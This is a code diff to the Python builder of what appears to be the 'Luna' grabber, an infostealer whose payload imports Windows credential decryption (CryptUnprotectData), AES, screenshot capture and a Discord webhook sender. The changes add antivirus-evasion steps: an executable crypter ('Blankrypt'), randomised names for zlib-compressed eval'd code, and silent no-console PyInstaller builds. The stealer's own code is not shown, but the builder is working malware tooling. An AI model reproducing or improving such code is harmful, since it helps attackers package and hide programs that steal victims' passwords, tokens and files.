@@ -161,6 +161,9 @@ class Builder:
         except BaseException:
             return False
 
+    def random_string(self):
+        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(15))
+
     def check(self):
         required_files = {'./luna.py',
                           './requirements.txt',
@@ -215,11 +218,11 @@ class Builder:
         except Exception:
             pass
         try:
-            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
+            os.rename(f"./Crypted_compressed_{filename}.exe", f"./{filename}.exe")
         except Exception:
             pass
         try:
-            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
+            os.rename(f"./Crypted_obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
         except Exception:
             pass
 
@@ -252,15 +255,17 @@ class Builder:
         with open(file='compressed_' + (filename.split('\\')[-1] if '\\' in filename else filename.split('/')[-1]) + '.py', mode='w', encoding='utf-8') as f:
             f.write(content)
             if self.obfuscation == 'n' and self.compy == 'y':
-                f.write("\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64;from tkinter import messagebox;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")
+                f.write("\nimport os, platform, re, threading, uuid, requests, wmi, subprocess, sqlite3, psutil, json, base64, ctypes;from shutil import copy2;from zipfile import ZipFile;from Crypto.Cipher import AES;from discord import Embed, File, SyncWebhook;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")
 
         print(f"{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")
 
         if self.obfuscation == 'y' and self.compy == 'y':
             self.encryption(f"compressed_{filename}")
             self.compile(f"obfuscated_compressed_{filename}")
+            self.exe_crypt(f"obfuscated_compressed_{filename}")
         elif self.obfuscation == 'n' and self.compy == 'y':
             self.compile(f"compressed_{filename}")
+            self.exe_crypt(f"compressed_{filename}")
         elif self.obfuscation == 'y' and self.compy == 'n':
             self.encryption(f"compressed_{filename}")
         else:
@@ -268,7 +273,7 @@ class Builder:
 
     def compress(self, content):
         compressed_code = compress(content)
-        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"
+        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='{self.random_string()}',mode='exec'))"
 
     def encryption(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
@@ -283,6 +288,11 @@ class Builder:
         os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
+    def exe_crypt(self, filename):
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Encrypting executable...{Fore.RESET}')
+        subprocess.run(["./tools/Blankrypt.exe", f"{filename}.exe"], capture_output=True, check=True)
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Executable encrypted!{Fore.RESET}')
+
     def run(self, filename):
         print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} Attempting to execute file...')
 
@@ -293,7 +303,8 @@ class Builder:
 
     def cleanup(self, filename):
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py', f'./compressed_{filename}.spec'}
+        cleans_file = {f'./{filename}.py', f'./obfuscated_compressed_{filename}.py', f'./compressed_{filename}.py',
+                       f'./compressed_{filename}.spec', f'./obfuscated_compressed_{filename}.exe', f'./compressed_{filename}.exe'}
 
         if self.obfuscation == 'y' and self.compy == 'n':
             cleans_file.remove(f'./obfuscated_compressed_{filename}.py')
